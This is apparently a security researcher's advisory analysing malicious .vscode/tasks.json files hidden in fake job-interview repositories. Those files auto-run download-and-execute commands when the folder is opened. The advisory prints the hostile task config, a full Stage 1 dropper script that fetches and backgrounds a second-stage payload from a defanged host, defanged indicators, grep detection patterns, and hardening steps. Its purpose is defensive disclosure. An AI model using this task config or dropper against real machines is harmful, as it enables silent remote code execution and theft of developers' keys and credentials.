# IDE Auto-Execute RCE via Malicious `.vscode/tasks.json` in Fake-Interview Repos

**Author:** Trygve Bundgaard — independent security researcher (GitHub: [@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))
**Discovered:** 2026-01-30
**Status:** Malware identified before execution during pre-open review of two private repositories delivered as "interview tasks"; both documented. Case B's repository was reported to GitHub (2026-01-30); Case A's was not. Both owning GitHub accounts now return 404 (checked 2026-10-08). Reporting the payload infrastructure to the hosting providers is recommended.
**Severity:** Critical — remote code execution the moment the folder is opened; zero interaction in Cursor's default configuration
**Type:** Social-engineering / supply-chain malware ("Contagious Interview" pattern)

> All indicators of compromise are **defanged** (`hxxp`, `[.]`). Do not re-arm them outside an isolated analysis environment.

## Summary

Two separate repositories, both sent as "technical tests" for blockchain/web3
developer roles, hid a remote code execution backdoor in **`.vscode/tasks.json`**
using `"runOn": "folderOpen"`. The task runs **automatically when the folder is
opened** in Cursor (which ships with Workspace Trust off) or in a trusted VS Code
workspace that allows automatic tasks — no build, no `npm install`, no user
action beyond opening the project. Each downloads and executes a remote payload with
`curl | sh` / `wget | sh`. The two repos share the same delivery pattern and
Vercel-hosted `/task/{os}` infrastructure, so I'm documenting them together.

## The vector

```jsonc
// .vscode/tasks.json
"tasks": [{
  "label": "vscode",
  "type": "shell",
  "osx":     { "command": "curl '<payload-url>' | sh" },
  "linux":   { "command": "wget -qO- '<payload-url>' | sh" },
  "windows": { "command": "curl <payload-url> | cmd" },
  "presentation": { "reveal": "never", "echo": false, "focus": false, "close": true },
  "runOptions":  { "runOn": "folderOpen" }   // ← auto-executes on open
}]
```

Stealth is layered:
- **`runOn: folderOpen`** — executes the moment the editor opens the folder, unless Workspace Trust or VS Code's automatic-task setting stops it (see Safe handling).
- **`reveal: never` / `echo: false` / `close: true`** — the terminal never shows, the command isn't echoed, and the panel closes itself.
- **Whitespace padding** — the real `curl`/`wget` command and URL are pushed far off-screen with long runs of spaces, so the line looks empty unless you scroll right.

### Case A — `chaledger` infrastructure

Direct platform-specific commands fetching from a Vercel app:

- `hxxps://chaledger[.]vercel[.]app/task/mac?token=f93a38103457` (`curl … | sh`)
- `hxxps://chaledger[.]vercel[.]app/task/linux?token=f93a38103457` (`wget -qO- … | sh`)
- `hxxps://chaledger[.]vercel[.]app/task/windows?token=f93a38103457` (`curl … | cmd`)

### Case B — URL-shortener + multi-stage dropper

The commands used a shortener (`chvsvr[.]short[.]gy`) that resolves to the same
`/task/{os}` pattern on a different Vercel app, and the fetched script is a
**multi-stage dropper**:

```bash
#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" "hxxp://robertivepack[.]vercel[.]app/task/tokenlinux?token=...&st=<JWT>"
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &   # runs in background, survives terminal close
clear
exit 0
```

Stage 1 downloads Stage 2 to `~/Documents/tokenlinux.sh`, backgrounds it with
`nohup`, and spams `clear` to hide output. **Stage 2 is JWT-gated.** The server
embeds a short-lived JWT (`st=`) in each freshly served Stage 1 script, carrying
the requester's IP address, a session ID, a step counter and a timestamp.
Requests for Stage 2 without a valid token return `"Access permanently
suspended."`, and I did not capture Stage 2. Treat it as capable of
credential/wallet theft and persistence until proven otherwise.

**Author spoofing (Case B):** the commits' git identity was spoofed to display
the name and avatar of a well-known academic open-source developer — who is an
unrelated **victim of impersonation**, not involved in the attack. The commits
were **unsigned** (no GPG verification), the org had no public members, and the
history appears to be imported from another developer's codebase. Lesson:
the author shown in a GitHub UI is not proof of authorship; check for verified
signatures.

## Indicators of compromise (defanged)

| Indicator | Value |
|-----------|-------|
| Technique | `.vscode/tasks.json` with `"runOptions": {"runOn": "folderOpen"}` running `curl`/`wget` piped to a shell |
| Payload host (A) | `chaledger[.]vercel[.]app/task/{mac,linux,windows}` |
| Payload host (B) | `robertivepack[.]vercel[.]app/task/{mac,linux,windows,tokenlinux}` |
| URL shortener (B) | `chvsvr[.]short[.]gy/98e0S0`, `/gekeyJ`, `/S9NCkt` |
| Tracking tokens | `f93a38103457` (A), `2a643f1b401f` (B) |
| Dropped file | `~/Documents/tokenlinux.sh` (and `.npl` staging file) |
| Tells | whitespace-padded commands; `reveal:never`/`echo:false`/`close:true`; unsigned commits spoofing a known developer |

## Impact

RCE on a developer workstation the instant the project is opened — on a web3
developer's machine that typically means wallet keys, RPC/API keys, SSH keys,
and cloud credentials. The multi-stage, JWT-gated design also hides the real
payload from analysts and lets the operator swap it per victim.

## Detection

```bash
# any .vscode task set to auto-run on folder open
grep -rn "folderOpen" --include=tasks.json .
# download-and-execute piped to a shell, inside editor config
grep -rn "curl .*| *sh\|wget .*| *sh\|| *cmd" .vscode/ 2>/dev/null
# flag padded/hidden commands and shorteners
grep -rn "short.gy\|vercel.app/task" .vscode/ 2>/dev/null
```

## Safe handling

- **Turn Workspace Trust on — Cursor ships with it off.** Set `"security.workspace.trust.enabled": true` in your user settings ([Cursor docs](https://cursor.com/docs/agent/security): workspace trust is "disabled by default"; see also [Oasis Security's 2025 writeup](https://www.oasis.security/blog/cursor-security-flaw)). Opening an untrusted folder in Restricted Mode prevents tasks from auto-running — this specific attack is neutralized by it.
- **In VS Code, review `task.allowAutomaticTasks`** ([VS Code docs](https://code.visualstudio.com/docs/debugtest/tasks), "Control automatic task execution"). Per the docs, "automatic tasks never run in an untrusted workspace, regardless of this setting."
- **Inspect `.vscode/tasks.json` before opening a repo** (view it on the web or pull files via the API first), and **scroll right** — padded lines hide the payload.
- **Never open an untrusted repo folder directly** in VS Code/Cursor; review files out-of-editor first, and run anything suspect only in a disposable VM.
- **Verify commit signatures**; a displayed author name is not proof of authorship.

## Campaign context

The shared `/task/{os}` fetch pattern on throwaway Vercel apps, the fake-interview
lure aimed at web3 developers, and the IDE-autorun delivery are **consistent with**
the "Contagious Interview" activity publicly reported since 2023. I'm documenting
the concrete indicators rather than asserting attribution. Reporting the Vercel
projects and the `short.gy` links to their providers for abuse is recommended.

Later public reporting describes the same tradecraft: Microsoft documented
Contagious Interview payloads served from Vercel-hosted URLs with per-OS paths
and token parameters
([March 2026](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)),
and an independent researcher found the same `tokenlinux.npl` → `tokenlinux.sh`
dropper naming behind a different C2 host
([July 2026](https://citizendot.github.io/articles/fake-job-interview-git-hook-malware/)).

---

*Published for the protection of the developer community. Indicators are
defanged, individuals' names withheld. — Trygve Bundgaard ([@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))*
